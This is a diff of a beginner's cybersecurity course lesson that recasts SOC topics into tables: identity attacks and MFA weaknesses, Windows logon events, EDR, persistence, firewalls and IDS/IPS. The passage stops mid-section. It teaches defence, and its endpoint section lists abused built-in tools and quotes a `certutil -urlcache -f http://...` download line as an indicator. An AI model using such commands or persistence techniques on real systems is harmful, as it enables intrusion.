@@ -81,68 +81,201 @@ Learn the core security concepts used across SOC, GRC, IT security, and pentesti
 
 ### Why this lesson exists
 
+#### Where the two previous phases meet
+
 Phase 1 gave you the vocabulary. Phase 2 gave you the plumbing. This phase is where the two meet, and where the job you are training for actually starts.
 
-Look again at the exit criterion, because it is the most specific one in the track so far: *you can explain a simple attack like phishing or web login abuse and name the logs, controls, and response steps involved.* Read that carefully, because it is asking for three separate things about one incident. Not "what is phishing" — that was Phase 1. It is: **which logs would show this**, **which controls would have stopped or caught it**, and **what would you do, in what order, once you saw it**. That triad is the shape of every SOC interview question you will ever be asked, and it is the shape of the work itself.
+Look again at the exit criterion, because it is the most specific one in the track so far: *you can explain a simple attack like phishing or web login abuse and name the logs, controls, and response steps involved.*
 
-**Why the phase is organised the way it is.** The six topic areas below — identity, endpoint, network, web, vulnerability management, and incident response — are not six separate subjects to memorise. They are six *places to look* during an investigation. When you finish this phase, you should be able to take any incident and walk it through those six lenses: who was involved (identity), what ran on the machine (endpoint), how it travelled (network), what the application did (web), what weakness allowed it (vulnerability management), and what happens next (incident response). That is the working method this lesson is trying to install.
+#### The three-part question
 
-This is also the last phase before you choose a specialisation in Phase 5. The purpose of the breadth here is not to make you good at all six — it is to make you *literate* in all six so that the choice in Phase 5 is informed rather than guessed. The phase notes this explicitly: "working literacy, not mastery."
+Read that carefully, because it is asking for three separate things about one incident.
 
-**Time to complete:** roughly 40–50 hours across six weeks. It is comparable in size to Phase 2 but wider rather than deeper, which means it is easier to get lost in. The antidote is the deliverable: five PortSwigger labs, five CVE summaries, one incident timeline, one control-mapping table. Those four artifacts are the phase. Reading without producing them will feel productive and teach you very little.
+| Question | What it is really asking |
+|---|---|
+| Which logs would show this? | Where does the evidence live, and what would it look like? |
+| Which controls would have stopped or caught it? | Preventive and detective thinking |
+| What would you do, in what order, once you saw it? | Response |
 
-**One strategic note about your web development background.** Of the six areas here, **web security is the one where you already have an unfair advantage.** You have written code, you know what a form submission does, and you have probably written a database query by string concatenation without knowing it was dangerous. That background is genuinely rare among cyber beginners, most of whom find the web material the hardest. The PortSwigger labs will land faster for you than for most people — lean into it, because "I understand why injection happens at the code level" is a differentiator in interviews.
+Not “what is phishing” — that was Phase 1. That triad is the shape of every SOC interview question you will ever be asked, and it is the shape of the work itself.
+
+#### Six places to look, not six subjects to memorise
+
+The six topic areas below are not six separate subjects. They are six *places to look* during an investigation.
+
+| Lens | The question it answers |
+|---|---|
+| Identity | Who was involved? |
+| Endpoint | What ran on the machine? |
+| Network | How did it travel? |
+| Web | What did the application do? |
+| Vulnerability management | What weakness allowed it? |
+| Incident response | What happens next? |
+
+When you finish this phase, you should be able to take any incident and walk it through those six lenses. That is the working method this lesson is trying to install.
+
+#### The last phase before you choose
+
+This is also the last phase before you choose a specialisation in Phase 5.
+
+The purpose of the breadth here is not to make you good at all six. It is to make you *literate* in all six, so that the choice in Phase 5 is informed rather than guessed. The phase notes this explicitly: “working literacy, not mastery.”
+
+#### How the time breaks down
+
+| What | Time | Note |
+|---|---|---|
+| Reading this lesson | ~5 hours | Six areas, framed as lenses |
+| Five PortSwigger labs | 10–15 hours | The single highest-value task for you |
+| Five CVE summaries | 6–8 hours | Drawn from CISA KEV |
+| Incident timeline and report | 6–8 hours | Ties the whole phase together |
+| Control-mapping table | 3–5 hours | Your first GRC-flavoured artifact |
+| Total | 40–50 hours across 6 weeks | Comparable to Phase 2 in size, wider rather than deeper |
+
+It is comparable in size to Phase 2 but wider rather than deeper, which means it is easier to get lost in. The antidote is the deliverable: five PortSwigger labs, five CVE summaries, one incident timeline, one control-mapping table. Those four artifacts are the phase. Reading without producing them will feel productive and teach you very little.
+
+#### One strategic note about your web development background
+
+Of the six areas here, **web security is the one where you already have an unfair advantage.**
+
+You have written code, you know what a form submission does, and you have probably written a database query by string concatenation without knowing it was dangerous. That background is genuinely rare among cyber beginners, most of whom find the web material the hardest.
+
+The PortSwigger labs will land faster for you than for most people. Lean into it, because “I understand why injection happens at the code level” is a differentiator in interviews.
 
 ### Part 1 — Identity security: who are you, and should you be here?
 
 #### The three questions, revisited with attack names attached
 
-Phase 1 introduced authentication, authorisation, and accounting (AAA). Here is what failure looks like in each, because recognising the failure is the skill:
+Phase 1 introduced authentication, authorisation, and accounting (AAA). Here is what failure looks like in each, because recognising the failure is the skill.
 
-- **Authentication failure** — the attacker has valid credentials they should not have. Phished password, credential stuffing against a reused password, a sprayed `Summer2025!`, or a stolen session token. In the logs this looks like a *successful* login from an unexpected place. Nothing is "failing"; that is what makes it hard.
-- **Authorisation failure** — the attacker is legitimately logged in but reaches things they should not. A standard user who can open the finance share. A customer who can read another customer's order by changing a number in the URL (this is IDOR, covered in Part 4).
-- **Accounting failure** — nobody can tell what happened, because the logs are absent, incomplete, or not retained. This is the failure that turns a contained incident into an unanswerable one.
+| Failure | What it looks like | Why it is hard to spot |
+|---|---|---|
+| **Authentication failure** | The attacker has valid credentials they should not have — a phished password, credential stuffing against a reused password, a sprayed `Summer2025!`, or a stolen session token | In the logs this looks like a *successful* login from an unexpected place. Nothing is “failing” |
+| **Authorisation failure** | The attacker is legitimately logged in but reaches things they should not — a standard user who can open the finance share, or a customer who can read another customer's order by changing a number in the URL (this is IDOR, covered in Part 4) | Every login is legitimate. The abuse looks like normal use |
+| **Accounting failure** | Nobody can tell what happened, because the logs are absent, incomplete, or not retained | This is the failure that turns a contained incident into an unanswerable one |
 
-The reason this matters for detection is a point beginners find counter-intuitive: **the most dangerous authentication events are successful logins.** A failed login is noise — the internet is full of automated attempts against every exposed service, and you saw that in Phase 2's auth logs. A *successful* login from an unusual location at an unusual time, for an account that has no reason to be there, is the signal worth investigating. Detection rules are built around this distinction.
+#### Why successful logins are the dangerous ones
 
-#### MFA, SSO, and why they are the highest-value controls
+The reason this matters for detection is a point beginners find counter-intuitive: **the most dangerous authentication events are successful logins.**
 
-**MFA** (Phase 1) remains the single most effective control against credential theft, and it is worth understanding *why* it is not perfect. The attacks that defeat MFA are worth naming because they are what you will actually see:
+A failed login is noise. The internet is full of automated attempts against every exposed service, and you saw that in Phase 2's auth logs. A *successful* login from an unusual location at an unusual time, for an account that has no reason to be there, is the signal worth investigating.
 
-- **MFA fatigue / push bombing** — repeated prompts until the victim approves one out of frustration. Defeated by number matching and by a rule that you never approve a prompt you did not initiate.
-- **Real-time phishing proxies** — a fake login page that relays the victim's credentials *and* their MFA response to the real site in real time, stealing the session that results. This is why phishing-resistant factors exist.
-- **SIM swapping** — the attacker convinces a mobile carrier to move the victim's number to a SIM they control, defeating SMS-based codes. This is the concrete reason SMS MFA is considered the weakest form.
-- **Session token theft** — the attacker does not need the password or the MFA prompt at all if they can steal the session cookie issued *after* authentication. This is why cookie flags (Part 4) and token protection matter.
+Detection rules are built around this distinction.
 
-The ranking to remember, strongest to weakest: **hardware security keys (FIDO2/WebAuthn) > authenticator apps with number matching > push notifications > SMS codes.** The pattern is simple — the further the factor is from something that can be relayed or intercepted remotely, the better it is.
+#### MFA, and why it is not perfect
 
-**SSO** (Single Sign-On) lets one identity provider authenticate you across many applications. The security benefit is real and worth stating precisely: it **centralises authentication**, so there is one place to enforce MFA, one place to revoke access, and one log of every login across every application. Without SSO, disabling a departing employee means chasing dozens of separate accounts, and each one is a chance to miss a system.
+**MFA** (Phase 1) remains the single most effective control against credential theft. It is worth understanding *why* it is not perfect, so here are the attacks that defeat it.
+
+| Attack | How it works | What stops it |
+|---|---|---|
+| **MFA fatigue / push bombing** | Repeated prompts until the victim approves one out of frustration | Number matching, and a rule that you never approve a prompt you did not initiate |
+| **Real-time phishing proxies** | A fake login page relays the victim's credentials *and* their MFA response to the real site in real time, stealing the session that results | Phishing-resistant factors — this is why they exist |
+| **SIM swapping** | The attacker convinces a mobile carrier to move the victim's number to a SIM they control, defeating SMS-based codes | Not using SMS. This is the concrete reason SMS MFA is considered the weakest form |
+| **Session token theft** | The attacker does not need the password or the MFA prompt at all if they can steal the session cookie issued *after* authentication | Cookie flags (Part 4) and token protection |
+
+#### Ranking the factors, strongest to weakest
+
+| Rank | Factor | Why it sits there |
+|---|---|---|
+| 1 (strongest) | Hardware security keys (FIDO2/WebAuthn) | Cannot be relayed or intercepted remotely |
+| 2 | Authenticator apps with number matching | Bound to the specific login attempt |
+| 3 | Push notifications | Approvable by an irritated user |
+| 4 (weakest) | SMS codes | Defeated by SIM swapping and interception |
+
+The pattern is simple: the further the factor is from something that can be relayed or intercepted remotely, the better it is.
+
+#### SSO: one login, and one point of failure
+
+**SSO** (Single Sign-On) lets one identity provider authenticate you across many applications.
+
+The security benefit is real and worth stating precisely: it **centralises authentication**.
+
+| What centralising buys you | Why |
+|---|---|
+| One place to enforce MFA | You configure it once, not per application |
+| One place to revoke access | Offboarding is one action, not dozens |
+| One log of every login across every application | Investigation starts from a single source |
+
+Without SSO, disabling a departing employee means chasing dozens of separate accounts, and each one is a chance to miss a system.
 
 The trade-off is equally real: SSO makes the identity provider a **single point of failure**. Compromise one account with SSO access and you may reach everything behind it. This is why identity providers get the strongest controls available — hardware keys, conditional access, and aggressive monitoring.
 
-**Conditional access** is the modern refinement: policy that decides whether to allow a login based on context rather than credentials alone. Is the device managed? Is the location expected? Is the risk score from the identity provider high? A login with a correct password from an unmanaged device in an unexpected country can be blocked or forced to re-authenticate. This is the control that most directly addresses the authentication failures above.
+#### Conditional access: deciding on context, not just credentials
 
-#### The detections you should be able to describe
+**Conditional access** is the modern refinement. It is policy that decides whether to allow a login based on context rather than credentials alone.
+
+| Signal | Example decision |
+|---|---|
+| Is the device managed? | An unmanaged device may be blocked or require extra verification |
+| Is the location expected? | A login from an unexpected country can be challenged |
+| Is the risk score from the identity provider high? | A high score forces re-authentication or blocks outright |
+
+A login with a correct password from an unmanaged device in an unexpected country can be blocked or forced to re-authenticate. This is the control that most directly addresses the authentication failures above.
+
+#### Account lockout: a control that can be abused
 
 Three alert types come up constantly in SOC work, and the phase lists all three. Being able to explain them — and to say what a *false positive* looks like — is exactly the literacy this phase wants.
 
-**Account lockout.** A policy that locks an account after N failed attempts, used to blunt brute-force attacks. But note the nuance: lockout is a control that can itself be abused. An attacker who deliberately locks accounts is performing a **denial of service**, and in some cases lockout spikes are how an attacker forces a helpdesk call that they then social-engineer. The SOC question is not "did an account lock" but "is this one account being hammered, or many accounts lightly touched?" The second pattern is spraying (Phase 1) and evades lockout entirely, because each account sees only one failure.
+**Account lockout** is a policy that locks an account after N failed attempts, used to blunt brute-force attacks.
 
-**Suspicious login.** A successful login that does not fit the account's normal pattern. What makes it suspicious is context: a new country, a new device, an unusual hour, or a login to an application the user has never touched. The investigative instinct to build now: **compare against a baseline.** "Suspicious" is meaningless without knowing what normal looks like for that account.
+But note the nuance: lockout is a control that can itself be abused. An attacker who deliberately locks accounts is performing a **denial of service**. In some cases, lockout spikes are how an attacker forces a helpdesk call that they then social-engineer.
 
-**Impossible travel.** Two successful logins from geographically distant locations within a timeframe that makes physical travel impossible — Manila at 09:00 and London at 09:30. It is a strong signal because it cannot be explained by the user simply moving. Two honest caveats that separate a thoughtful analyst from one reciting a rule: VPNs and corporate proxies routinely cause false positives, because the apparent location is the exit node rather than the user; and a *real* attacker may also use a VPN precisely to make their location look plausible. The alert is a prompt to investigate, not a conclusion.
+The SOC question is not “did an account lock?” but “is this one account being hammered, or many accounts lightly touched?”
+
+| Pattern | What it is | Why it matters |
+|---|---|---|
+| One account, many failures | Brute force | Lockout policy will trigger and blunt it |
+| Many accounts, one failure each | Spraying (Phase 1) | Evades lockout entirely, because each account sees only one failure |
+
+#### Suspicious login, and the baseline problem
+
+**Suspicious login** is a successful login that does not fit the account's normal pattern.
+
+What makes it suspicious is context:
+
+| Signal | What it suggests |
+|---|---|
+| A new country | Travel, a VPN, or a compromise |
+| A new device | A new machine, or an attacker's machine |
+| An unusual hour | Off-hours work, or automation |
+| A login to an application the user has never touched | Lateral access or a compromised account |
+
+The investigative instinct to build now: **compare against a baseline.** “Suspicious” is meaningless without knowing what normal looks like for that account.
+
+#### Impossible travel, and its two honest caveats
+
+**Impossible travel** is two successful logins from geographically distant locations within a timeframe that makes physical travel impossible — Manila at 09:00 and London at 09:30.
+
+It is a strong signal because it cannot be explained by the user simply moving. Two honest caveats separate a thoughtful analyst from one reciting a rule.
+
+| Caveat | Why it happens |
+|---|---|
+| VPNs and corporate proxies routinely cause false positives | The apparent location is the exit node rather than the user |
+| A *real* attacker may also use a VPN | Precisely to make their location look plausible |
+
+The alert is a prompt to investigate, not a conclusion.
 
 #### Least privilege, RBAC, and access reviews
 
 **Least privilege** and **access review** were defined in Phase 1. The new material here is **RBAC** — Role-Based Access Control — which is how least privilege is actually implemented at scale.
 
-Rather than granting permissions to individuals, you define **roles** that bundle the permissions a job function needs, and you assign people to roles. `Helpdesk-Tier1` gets password reset and ticket access. `Finance-ReadOnly` gets read access to finance systems. A person changing jobs changes role, and their access changes with it in one operation.
+Rather than granting permissions to individuals, you define **roles** that bundle the permissions a job function needs, and you assign people to roles.
 
-Note that this is the group pattern from the IT track's sysadmin phase, scaled up and named. In fact every access question in this phase reduces to the same shape you already learned: **user → role → permission**, never user → permission directly. When an access review asks "who can read the finance share?", the answer should be one role's membership list, not a manual audit of a hundred individual grants.
+| Role | Grants |
+|---|---|
+| `Helpdesk-Tier1` | Password reset and ticket access |
+| `Finance-ReadOnly` | Read access to finance systems |
+
+A person changing jobs changes role, and their access changes with it in one operation.
+
+#### The shape every access question takes
+
+Note that this is the group pattern from the IT track's sysadmin phase, scaled up and named.
+
+In fact every access question in this phase reduces to the same shape you already learned: **user → role → permission**, never user → permission directly. When an access review asks “who can read the finance share?”, the answer should be one role's membership list, not a manual audit of a hundred individual grants.
 
 #### Turning identity into log evidence
 
-This is the part that makes identity *detective* rather than just administrative, and it connects directly to the exit criterion. The Windows Event IDs the phase lists are the foundation:
+This is the part that makes identity *detective* rather than just administrative, and it connects directly to the exit criterion. The Windows Event IDs the phase lists are the foundation.
 
 | Event ID | Meaning | Why an analyst cares |
 |---:|---|---|
@@ -152,9 +285,23 @@ This is the part that makes identity *detective* rather than just administrative
 | **4672** | Special privileges assigned | An account granted admin-level rights at logon |
 | **4720 / 4726** | User account created / deleted | Persistence. A new account is a foothold |
 
-The **logon type** in a 4624 event is worth understanding, because it answers "how did they get in?" Type 2 is a local console login. Type 3 is a network logon — a file share or a remote service. Type 10 is Remote Desktop, which is where you would look after a suspected RDP compromise. Seeing logon type 10 for an account that never uses RDP is a finding.
+#### Reading the logon type in a 4624 event
 
-In Linux the equivalent evidence lives where Phase 2 showed you: `/var/log/auth.log` or `/var/log/secure`, read through `journalctl -u sshd`. The investigative questions are the same ones — which account, from where, at what time, and does that fit the baseline.
+The **logon type** in a 4624 event is worth understanding, because it answers “how did they get in?”
+
+| Logon type | What it means | When you would look here |
+|---:|---|---|
+| 2 | Local console login | Someone physically at the machine |
+| 3 | Network logon — a file share or a remote service | Lateral movement, share access |
+| 10 | Remote Desktop (RDP) | After a suspected RDP compromise |
+
+Seeing logon type 10 for an account that never uses RDP is a finding.
+
+#### The Linux equivalent
+
+In Linux the equivalent evidence lives where Phase 2 showed you: `/var/log/auth.log` or `/var/log/secure`, read through `journalctl -u sshd`.
+
+The investigative questions are the same ones — which account, from where, at what time, and does that fit the baseline.
 
 The point to carry forward: **identity is where nearly every investigation begins**, because nearly every attack needs an account. Part 6's incident timeline is built on exactly this foundation.
 
@@ -162,21 +309,65 @@ The point to carry forward: **identity is where nearly every investigation begin
 
 #### What EDR actually does, and how it differs from antivirus
 
-**Antivirus (AV)** and **Endpoint Detection and Response (EDR)** are often spoken of together, and they are genuinely different tools.
+**Antivirus (AV)** and **Endpoint Detection and Response (EDR)** are often spoken of together. They are genuinely different tools.
 
-Traditional **AV** works primarily by **signature**: it holds a database of known-malicious file hashes and patterns and blocks matches. This is fast and effective against known malware, and structurally useless against anything new or modified. Change one byte of a known virus and the signature no longer matches. This is why "the antivirus says it is clean" was never proof of anything, a point Phase 1 made about rootkits.
+| Tool | How it works | Strength | Structural weakness |
+|---|---|---|---|
+| **AV** | Holds a database of known-malicious file hashes and patterns, and blocks matches | Fast and effective against known malware | Useless against anything new or modified. Change one byte of a known virus and the signature no longer matches |
+| **EDR** | Continuously records what happens on the endpoint and evaluates those sequences against known-attack patterns | Catches behaviour, not just identity | Nothing catches everything; it is only as good as its baseline |
 
-**EDR** works primarily by **behaviour**. It continuously records what happens on the endpoint — processes starting, files written, registry keys changed, network connections made — and evaluates those sequences against known-attack patterns. Instead of asking "is this file known-bad?", it asks "does this *sequence of actions* look like an attack?" A document reader spawning a command shell, which then downloads a file and adds a scheduled task, is suspicious regardless of whether any individual step matches a signature.
+The AV weakness is why “the antivirus says it is clean” was never proof of anything, a point Phase 1 made about rootkits.
 
-That behavioural record is the second half of EDR's value: **telemetry**. An EDR agent keeps a searchable history of endpoint activity, which means that after an alert you can reconstruct what happened. This is where the free tools in this phase's table fit. **Sysmon** (System Monitor, from Microsoft's Sysinternals suite) is not antivirus and does not block anything — it is a telemetry source that writes detailed process, network, and file events to the Windows event log, which is what makes host investigation possible at all. **Wazuh** collects and analyses those events centrally.
+#### Detection by behaviour, not by signature
 
-A useful way to hold the relationship: Sysmon *records*, EDR *detects and responds*, AV *blocks known bad*, and a SIEM *correlates across many sources*. The phase's tools table gives you the free end of each category.
+The shift in the second row of that table is the important idea. Instead of asking “is this file known-bad?”, EDR asks “does this *sequence of actions* look like an attack?”
+
+Consider this chain:
+
+| Step | Action |
+|---|---|
+| 1 | A document reader starts |
+| 2 | It spawns a command shell |
+| 3 | The shell downloads a file |
+| 4 | A scheduled task is added |
+
+That is suspicious regardless of whether any individual step matches a signature. No single step is malicious on its own. The sequence is.
+
+#### Telemetry: the second half of EDR's value
+
+That behavioural record is the second half of EDR's value: **telemetry**. An EDR agent keeps a searchable history of endpoint activity, which means that after an alert you can reconstruct what happened.
+
+This is where the free tools in this phase's table fit.
+
+| Tool | What it is | What it is not |
+|---|---|---|
+| **Sysmon** (System Monitor, from Microsoft's Sysinternals suite) | A telemetry source that writes detailed process, network, and file events to the Windows event log | Not antivirus, and it does not block anything |
+| **Wazuh** | Collects and analyses those events centrally | Not an endpoint agent on its own |
+
+Sysmon is what makes host investigation possible at all.
+
+#### Holding the four categories straight
+
+A useful way to hold the relationship:
+
+| Tool category | Its one job |
+|---|---|
+| Sysmon | *Records* |
+| EDR | *Detects and responds* |
+| AV | *Blocks known bad* |
+| SIEM | *Correlates across many sources* |
+
+The phase's tools table gives you the free end of each category.
 
 #### The Event IDs that reveal process activity
 
-Event ID **4688** (process creation) is the endpoint equivalent of the identity event IDs, and it has one important practical caveat the phase hints at with "if enabled": **process creation auditing is not on by default on Windows.** You must enable it, which is itself a lesson about detection — *the absence of an event does not mean the absence of activity; it may mean nobody turned the logging on.*
+Event ID **4688** (process creation) is the endpoint equivalent of the identity event IDs, and it has one important practical caveat the phase hints at with “if enabled”: **process creation auditing is not on by default on Windows.**
 
-When 4688 is enabled alongside Sysmon, each process start records the **parent process**, and the parent-child relationship is where detection lives:
+You must enable it, which is itself a lesson about detection — *the absence of an event does not mean the absence of activity; it may mean nobody turned the logging on.*
+
+#### Parent-child relationships are where detection lives
+
+When 4688 is enabled alongside Sysmon, each process start records the **parent process**.
 
 | Pattern | Why it is suspicious |
 |---|---|
@@ -185,42 +376,65 @@ When 4688 is enabled alongside Sysmon, each process start records the **parent p
 | `outlook.exe` → `cmd.exe` | Email client spawning a shell |
 | `svchost.exe` with an unusual parent | `svchost` should be spawned by `services.exe`. Any other parent suggests masquerading |
 
-That last row introduces **masquerading** — naming a malicious file after a legitimate system process to blend in. It is a MITRE ATT&CK technique (T1036), and it is why an analyst checks the *full path* rather than the filename: a `svchost.exe` running from `C:\Users\Public\` rather than `C:\Windows\System32\` is not the real one. Legitimate Windows binaries run from their expected directories, and that predictability is what makes impersonation detectable.
+#### Masquerading, and why you check the full path
+
+That last row introduces **masquerading** — naming a malicious file after a legitimate system process to blend in. It is a MITRE ATT&CK technique (T1036).
+
+It is why an analyst checks the *full path* rather than the filename.
+
+| What you see | Verdict |
+|---|---|
+| `C:\Windows\System32\svchost.exe` | The real one |
+| `C:\Users\Public\svchost.exe` | Not the real one |
+
+Legitimate Windows binaries run from their expected directories, and that predictability is what makes impersonation detectable.
 
 #### Persistence: how malware survives a reboot
 
-**Persistence** is the set of techniques malware uses to survive restarts, and it is one of the most important concepts in this phase because it is where defenders have the advantage. The reason is simple: **an attacker must persist somewhere, and the places they can persist are a finite, enumerable list.** Knowing that list is knowing where to look.
+**Persistence** is the set of techniques malware uses to survive restarts. It is one of the most important concepts in this phase, because it is where defenders have the advantage.
 
-The common mechanisms:
+The reason is simple: **an attacker must persist somewhere, and the places they can persist are a finite, enumerable list.** Knowing that list is knowing where to look.
 
-- **Registry Run keys** — `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` and its `HKLM` equivalent cause a program to start at login. The classic location, and still heavily used.
-- **Scheduled tasks** — a task that runs a command on a trigger. Extremely common, because it looks like legitimate administration and can run as SYSTEM.
-- **Services** — a malicious service set to start automatically. Runs with high privilege and is easy to overlook.
-- **Startup folders** — files in the user's Startup directory. Simple and visible, so attackers with better options avoid it.
-- **WMI event subscriptions** — persistence through Windows Management Instrumentation, which is fileless and therefore harder to spot.
-- **Linux equivalents** — `cron` jobs, `systemd` unit files, shell profile files like `~/.bashrc`, and SSH `authorized_keys` (adding a key is persistence *and* a backdoor in one step).
+#### The common persistence mechanisms
 
-Each of these has an ordinary administrative purpose, which is exactly why persistence detection is hard: you are not looking for something that is obviously malicious, you are looking for something *unexplained*. This is where baseline knowledge does the work — you need to know what should be in the Run keys before you can say something should not be.
+| Mechanism | Where | What it does |
+|---|---|---|
+| **Registry Run keys** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` and its `HKLM` equivalent | Causes a program to start at login. The classic location, and still heavily used |
+| **Scheduled tasks** | Windows Task Scheduler | Runs a command on a trigger. Extremely common, because it looks like legitimate administration and can run as SYSTEM |
+| **Services** | Windows service control manager | A malicious service set to start automatically. Runs with high privilege and is easy to overlook |
+| **Startup folders** | The user's Startup directory | Simple and visible, so attackers with better options avoid it |
+| **WMI event subscriptions** | Windows Management Instrumentation | Persistence through WMI, which is fileless and therefore harder to spot |
+| **Linux equivalents** | `cron` jobs, `systemd` unit files, shell profile files like `~/.bashrc`, and SSH `authorized_keys` | Adding a key is persistence *and* a backdoor in one step |
+
+#### Why persistence detection is genuinely hard
+
+Each of those mechanisms has an ordinary administrative purpose. That is exactly why persistence detection is hard: you are not looking for something that is obviously malicious, you are looking for something *unexplained*.
+
+This is where baseline knowledge does the work. You need to know what should be in the Run keys before you can say something should not be.
 
 The investigative habit: **when you find one persistence mechanism, assume there are others.** Attackers commonly establish two or three, so that removing one does not evict them. A complete response removes all of them, which is why eradication (Part 6) follows a full enumeration rather than a single fix.
 
 #### Suspicious process indicators
 
-Beyond parent-child relationships, these are the process-level signals worth recognising:
+Beyond parent-child relationships, these are the process-level signals worth recognising.
 
-- **Living off the land** — using legitimate built-in tools for malicious purposes: `powershell.exe`, `cmd.exe`, `wmic`, `certutil`, `bitsadmin`, `rundll32`, `mshta`. These are "suspicious" not because they are malicious but because they are frequently *abused*, and security tools cannot simply block them. `certutil -urlcache -f http://...` downloading a file is a classic example: a legitimate certificate utility used as a downloader.
-- **Encoded command lines** — PowerShell invoked with `-EncodedCommand` and a long base64 string. There is almost no legitimate reason to obfuscate a command line, and it exists to defeat text-based detection.
-- **Processes running from odd locations** — `C:\Users\Public\`, `C:\Temp\`, `%APPDATA%`, or `/tmp` on Linux. Legitimate system binaries do not run from user-writable directories; that is the whole point of the expectation.
-- **Unexpected network connections from office applications** — Word opening a connection to an unfamiliar IP is not normal behaviour.
-- **Unusual accounts in process ownership** — a service running as a normal user account rather than a service account, or a process running as SYSTEM that has no business doing so.
+| Indicator | What it looks like | Why it is suspicious |
+|---|---|---|
+| **Living off the land** | Using legitimate built-in tools for malicious purposes: `powershell.exe`, `cmd.exe`, `wmic`, `certutil`, `bitsadmin`, `rundll32`, `mshta` | Suspicious not because they are malicious but because they are frequently *abused*, and security tools cannot simply block them. `certutil -urlcache -f http://...` downloading a file is a classic example: a legitimate certificate utility used as a downloader |
+| **Encoded command lines** | PowerShell invoked with `-EncodedCommand` and a long base64 string | There is almost no legitimate reason to obfuscate a command line, and it exists to defeat text-based detection |
+| **Processes from odd locations** | `C:\Users\Public\`, `C:\Temp\`, `%APPDATA%`, or `/tmp` on Linux | Legitimate system binaries do not run from user-writable directories; that is the whole point of the expectation |
+| **Unexpected network connections from office applications** | Word opening a connection to an unfamiliar IP | It is not normal behaviour for a document reader |
+| **Unusual accounts in process ownership** | A service running as a normal user account rather than a service account, or a process running as SYSTEM that has no business doing so | Both indicate misconfiguration or compromise |
 
-Notice the recurring theme across every one of these: **the indicator is a deviation from expectation, not a signature of evil.** This is the single most important mental shift in endpoint security. You cannot detect modern intrusions by looking for known-bad; you detect them by knowing what normal looks like and noticing what does not.
+Notice the recurring theme across every one of these: **the indicator is a deviation from expectation, not a signature of evil.**
+
+This is the single most important mental shift in endpoint security. You cannot detect modern intrusions by looking for known-bad. You detect them by knowing what normal looks like and noticing what does not.
 
 ### Part 3 — Network security
 
 #### Firewalls: rules, direction, and default posture
 
-A **firewall** permits or denies traffic based on rules, and the rule anatomy is worth being precise about because you will read these in real jobs:
+A **firewall** permits or denies traffic based on rules. The rule anatomy is worth being precise about, because you will read these in real jobs.
 
 ```text
 Action | Source        | Destination   | Port | Protocol | Direction
@@ -228,38 +442,81 @@ ALLOW  | 10.0.0.0/24   | 10.0.5.20     | 443  | TCP      | Inbound
 DENY   | any           | 10.0.5.20     | 3389 | TCP      | Inbound
 ```
 
-Two concepts matter more than any individual rule. The first is **default posture**. A **default-deny** firewall blocks everything not explicitly allowed; a **default-allow** firewall permits everything not explicitly blocked. Default-deny is the correct posture and the industry standard, because it means a forgotten rule fails safely. Default-allow means every oversight is an open door.
+#### Default posture: the decision that matters most
 
-The second is **direction and state**. Modern firewalls are **stateful**: when an internal machine makes an outbound connection, the firewall remembers it and permits the return traffic automatically. This is why a rule permitting outbound traffic does not require a matching inbound rule. It also explains why the *direction* of a rule is essential context — an inbound deny for port 3389 that permits outbound 3389 tells you the rule set was written without understanding what it protects.
+Two concepts matter more than any individual rule. The first is **default posture**.
 
-The security analysis of a firewall rule set asks three questions: **what is unnecessarily open, what is open to too many sources, and what is stale?** A rule permitting RDP from `any` is the first. A rule permitting database access from the entire corporate network rather than one application server is the second. A rule left over from a project that ended two years ago is the third, and stale rules are the most common real finding, because nobody wants to delete a rule in case something breaks.
+| Posture | Behaviour | Consequence |
+|---|---|---|
+| **Default-deny** | Blocks everything not explicitly allowed | A forgotten rule fails safely. This is the correct posture and the industry standard |
+| **Default-allow** | Permits everything not explicitly blocked | Every oversight is an open door |
+
+#### Direction and state
+
+The second concept is **direction and state**.
+
+Modern firewalls are **stateful**. When an internal machine makes an outbound connection, the firewall remembers it and permits the return traffic automatically. This is why a rule permitting outbound traffic does not require a matching inbound rule.
+
+It also explains why the *direction* of a rule is essential context. An inbound deny for port 3389 that permits outbound 3389 tells you the rule set was written without understanding what it protects.
+
+#### Three questions to ask of any rule set
+
+The security analysis of a firewall rule set asks three questions.
+
+| Question | Example of the finding |
+|---|---|
+| What is unnecessarily open? | A rule permitting RDP from `any` |
+| What is open to too many sources? | A rule permitting database access from the entire corporate network rather than one application server |
+| What is stale? | A rule left over from a project that ended two years ago |
+
+Stale rules are the most common real finding, because nobody wants to delete a rule in case something breaks.
 
 #### IDS and IPS: detection versus prevention
 
 **IDS** (Intrusion Detection System) monitors traffic and *alerts*. **IPS** (Intrusion Prevention System) monitors and *blocks*. The single-letter difference is the whole story, and so is the trade-off.
 
-An IPS sits inline, in the path of traffic, which means it can stop an attack — and means that a false positive *breaks legitimate traffic*. An IDS sits out of band, receiving a copy, which means it can never break anything and also can never stop anything. This is why organisations often start in detection mode even with IPS-capable hardware: blocking first, before you understand your false-positive rate, is how you cause an outage.
+| System | Position | Can it stop an attack? | Cost of a false positive |
+|---|---|---|---|
+| **IPS** | Inline, in the path of traffic | Yes | It *breaks legitimate traffic* |
+| **IDS** | Out of band, receiving a copy | No | It can never break anything, and can never stop anything |
 
-Detection methods are worth distinguishing:
+This is why organisations often start in detection mode even with IPS-capable hardware. Blocking first, before you understand your false-positive rate, is how you cause an outage.
 
-- **Signature-based** — matches known attack patterns. Precise, but blind to anything new.
-- **Anomaly-based** — flags deviation from a learned baseline. Catches novel attacks, at the cost of many false positives, because networks are full of legitimate unusual behaviour.
+#### Detection methods: signatures versus anomalies
 
-Both struggle with the same fundamental problem, and naming it is what shows understanding: **encrypted traffic**. If TLS hides the content, signature matching cannot see inside without interception. This is why modern detection leans on metadata — connection patterns, volumes, timing, destinations, and JA3/JA4 fingerprints of the TLS handshake itself — rather than payload inspection.
+| Method | How it works | Catches | Cost |
+|---|---|---|---|
+| **Signature-based** | Matches known attack patterns | Known attacks, precisely | Blind to anything new |
+| **Anomaly-based** | Flags deviation from a learned baseline | Novel attacks | Many false positives, because networks are full of legitimate unusual behaviour |
+
+Both struggle with the same fundamental problem, and naming it is what shows understanding: **encrypted traffic**.
+
+If TLS hides the content, signature matching cannot see inside without interception. This is why modern detection leans on metadata — connection patterns, volumes, timing, destinations, and JA3/JA4 fingerprints of the TLS handshake itself — rather than payload inspection.
 
 #### VPNs and segmentation
 
-A **VPN** (Phase 2) creates an encrypted tunnel; in corporate use it also places the remote device *inside* the network, as though it were on-site. That is its security purpose and its risk in one sentence: a compromised laptop on the VPN is an internal machine, with internal reach.
